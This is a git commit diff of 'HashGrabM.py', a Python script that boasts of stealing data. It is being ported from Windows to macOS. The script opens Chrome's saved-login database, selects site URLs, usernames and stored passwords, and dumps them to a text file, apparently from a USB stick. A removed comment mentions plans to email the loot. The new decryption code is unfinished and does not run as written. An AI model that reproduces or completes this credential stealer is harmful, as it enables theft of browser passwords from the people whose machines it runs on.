0f67f87b7f70a3cb1a9b9b07c52b7da15b4267a9
TheStandardPancake <40510902+TheStandardPancake@users.noreply.github.com>
2019-04-16 12:58:24 +1000

    working on the mac chrome data breach

--- HashGrab/HashGrabM.py
+++ HashGrab/HashGrabM.py
@@ -1,30 +1,43 @@
 #Works on mac
 import os
-from os import getenv
+from os.path import expanduser
 import sqlite3
-import
+import binascii
+import subprocess
 
 print("""
 Stealing Ya' Data since 2019
 
+           nom, nom, yummy apple data
+___________________________$$
+ _________________________$$$$
+ _______________________$$$$$$
+ ______________________$$$$$$
+ ______________________$$$$
+ ______________________$$
+ _________$$$$$$$$$$$$$_$$$$$$$$$$$$$
+ ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ _____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ ________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ __________$$$$$$$$$$$$$$$$$$$$$$$$$
+ ____________$$$$$$$$$$$$$$$$$$$$$
+ ______________$$$$$$$$__$$$$$$
 
-                       El Getaway Car
-       	    	    _____________________
-                   /	        |	  \ .
-                  /             |          \ .
-                 / _____________|__________ \ .
-    ____________|      \        |    \       |_____________
-    |       ____|____           |          ________       |
-    |      /         \          |         /        \      |
-    |_____/    | |    \ ________________ /   |  |   \_____|
-          \    | |    /                  \   |  |   /
-           \_________/                    \________/
-
-Remastered by TheStandardPancake, credit to bluedangerforyou for writing the original code
+made by TheStandardPancake, The Mac Edition!
 
 """)
-#essentially I cut out any code that was not necessary, and optimised the file locating methods so that there is no longer any need for manual interaction (now a fully automated process)
-#I alson plan on creating a feature to then email the results so that that as soon as the program is run, that is the end of all you need to do, the data is yours.
+#this version for mac was made pretty much entirely by me this time, though still I give some credit to bluedangerforyou for inspiration
 
 #setting up the file to dump info
 usb = os.path.abspath(__file__)
@@ -38,12 +51,15 @@ password_field = "Password: "
 
 #The magic happens
 f = open(os.path.join(path,"passwordsusers.txt"), "w")
-conn = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data")
+conn = sqlite3.connect(expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"))
 cursor = conn.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+
+def decryting(encrypted, iv, key=none):
+    hexKey = binascii.hexlify(key)
+
+
 for result in cursor.fetchall():
-	#password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-	#if password:
-	f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + str(password) + '\n' + '--------------------------------' + '\n')
+	password =
+	   f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
 f.close()
-print("Congrats, your data is now stolen, LOL!")
